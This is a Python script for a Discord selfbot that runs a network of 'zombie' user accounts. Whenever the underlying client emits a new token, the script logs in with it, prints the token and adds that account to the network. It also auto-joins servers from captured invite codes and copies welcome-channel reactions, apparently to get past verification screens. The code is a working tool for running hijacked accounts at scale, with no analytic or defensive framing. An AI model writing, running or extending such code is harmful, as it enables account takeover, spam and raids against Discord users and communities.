from hashlib import sha256
import main
import time
import os

ftoken = os.getenv("TOKEN")


def hash(x):
    return sha256(x.encode()).hexdigest()


def id_in(x, y):
    if x.get("id") == None:
        return
    for a in y:
        if a.get("id") == x.get("id"):
            return True
    return False


class Zombie:
    zombies = []

    def __init__(self, token):
        self.token = token
        self.id = hash(token)
        self.client = main.SelfBot(token, debug=1, log=False)
        self.guilds = []
        self.used_invites = []

        @self.client.events("READY")
        def ready(client, ready):
            fid = hash(str(time.time()) + self.id + "READY")
            print(fid, ready.keys())
            for guild in ready["guilds"]:
                if not id_in(guild, self.guilds):
                    self.guilds.append(guild)

        @self.client.events("READY_SUPPLEMENTAL")
        def ready_plus(client, ready):
            fid = hash(str(time.time()) + self.id + "READY_SUPPLEMENTAL")
            print(fid, ready.keys())
            for guild in ready["guilds"]:
                if not id_in(guild, self.guilds):
                    self.guilds.append(guild)

        @self.client.events("GUILD_MEMBER_REMOVE")
        def a_leave(client, data):
            if data["user"]["id"] == client.data["user"]["id"]:
                for i, guild in enumerate(self.guilds):
                    if guild["id"] == data["guild_id"]:
                        del self.guilds[i]

        @self.client.events("GUILD_DELETE")
        def leave2(client, data):
            for i, guild in enumerate(self.guilds):
                if guild["id"] == data["id"]:
                    del self.guilds[i]

        @self.client.events("ON_TOKEN")
        def new_zombie(client, token):
            fid = hash(str(time.time()) + self.id + "ON_TOKEN")
            print(fid, time.time(), "--> got a new token :", token)
            self.zombies.append(Zombie(token))

        @self.client.events("ON_INVITE")
        def new_server(client, code):
            fid = hash(str(time.time()) + self.id + "ON_INVITE")
            print(fid, time.time(), "ON_INVITE (", code, ")")
            if code in self.used_invites:
                pass  # print(fid, time.time(), "--> code already used")
                # return
            self.used_invites.append(code)
            print(fid, time.time(), "--> is getting infos of an invite :",
                  code + "...")
            infos = client.get_invite_infos(code)
            print(fid, time.time(), "--> getting infos end :", infos)
            guild = infos.get("guild", {})
            if id_in(guild, self.guilds):
                print(fid, time.time(), "--> already in this server")
                return
            print(fid, time.time(), "--> is joining a new server :",
                  code + "...")
            invite = client.join_guild(code)
            print(fid, time.time(), "--> joining server end :", invite)
            self.used_invites.append(code)
            print(fid, time.time(), "--> checking welcome channels :",
                  repr(invite.get("guild", {})) + "...")
            for channel in invite.get("guild",
                                      {}).get("welcome_screen",
                                              {}).get("welcome_channels", []):
                for message in client.fetch_messages(channel["id"]):
                    print(
                        fid, time.time(),
                        f"--> checking message [{message['id']}] from welcome channels [{message['channel_id']}] :",
                        message)
                    for reaction in message["reactions"]:
                        print(
                            fid, time.time(),
                            f"--> checking reactions on message [{message['id']}] :",
                            reaction)
                        if reaction["count"] > 2:
                            print(fid, time.time(), "--> is adding reaction",
                                  reaction["emoji"]["name"], "in channel",
                                  message["channel_id"], "on message",
                                  message["id"])
                            print(
                                fid,
                                client.add_reaction(reaction["emoji"]["name"],
                                                    message["channel_id"],
                                                    message["id"]))

        self.client.run()


print("running :", __file__)
fzombie = Zombie(ftoken)
